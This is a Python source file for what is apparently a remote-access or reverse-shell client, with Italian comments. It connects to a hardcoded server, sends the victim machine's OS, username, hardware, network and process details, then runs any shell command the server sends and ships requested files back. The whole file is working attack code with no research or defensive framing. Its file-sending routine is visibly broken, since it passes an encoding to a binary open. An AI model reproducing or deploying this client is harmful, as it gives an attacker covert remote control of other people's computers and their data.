from socket import *
import subprocess
import os
from pathlib import Path
import getpass
import platform
import time


def connect():
    
    while True:

        try:

            clientPort = 11926
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.connect(('192.168.1.54',clientPort)) #localhost da sostituire con indirizzo ip statico del server

        except ConnectionRefusedError:

            print("Connection to Server failed\n")
            time.sleep(2)

        else:

            print("Connection to server established\n")
            return clientSocket


def setup_windows(connectionSocket):

    connectionSocket.send(command("systeminfo").encode(encoding='latin-1'))
    connectionSocket.send(command("ipconfig").encode(encoding='latin-1'))
    connectionSocket.send(command("getmac").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -p TCP").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -p UDP").encode(encoding='latin-1'))


def setup_linux(connectionSocket):

    connectionSocket.send(command("cat /etc/machine-id ").encode(encoding='latin-1'))
    connectionSocket.send(command("cat /etc/os-release").encode(encoding='latin-1'))
    connectionSocket.send(command("cat /proc/meminfo ").encode(encoding='latin-1'))
    connectionSocket.send(command("cat /proc/cpuinfo ").encode(encoding='latin-1'))
    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))    
    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
    connectionSocket.send(command("id").encode(encoding='latin-1'))


def setup_mac(connectionSocket):

    connectionSocket.send(command("sysctl machdep.cpu").encode(encoding='latin-1'))
    connectionSocket.send(command("system_profiler -detailLevel -1").encode(encoding='latin-1'))
    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
    connectionSocket.send(command("id").encode(encoding='latin-1'))


def setup(connectionSocket):
    system = platform.system()
    os.chdir(Path.home())

    connectionSocket.send(system.encode(encoding='latin-1'))
    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))

    if system == 'Windows':
        setup_windows(connectionSocket)
    
    if system == 'Linux':
        setup_linux(connectionSocket)
    
    if system == 'Darwin':
        setup_mac(connectionSocket)

    connectionSocket.send("uscita".encode(encoding='latin-1'))
    

def command(cmd):

    if cmd.startswith("cd") :

        if not((cmd[2:]).isspace() or len(cmd)==2) :
            os.chdir(cmd[3:])
        result = os.getcwd()

    else:
            
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout

        if result == '':
            result = "Command not valid or empty output\n"

    return result


def download(fileName, connectionSocket):

    try:
        file = open(fileName, "rb", encoding="latin-1")
        data = file.read(1024)

        while data:
            connectionSocket.send(data)
            data = file.read(1024)

        file.close()

    except:
        connectionSocket.send("Errore durante l' invio del file".encode(encoding='latin-1'))



def main():
    
    connectionSocket = connect()
    setup(connectionSocket)

    while True:
        try:
            cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
            
            if cmd == "esc":
                break

            if cmd.startswith("download"):
                download(cmd[9:], connectionSocket)
                connectionSocket.send(b'esc')
                continue

            connectionSocket.send(command(cmd).encode(encoding='latin-1'))

        except:
            connectionSocket.send("Error\n".encode(encoding='latin-1'))


    connectionSocket.close()
    print("\nConnection closed\n")
    

if __name__ == "__main__":
    main()

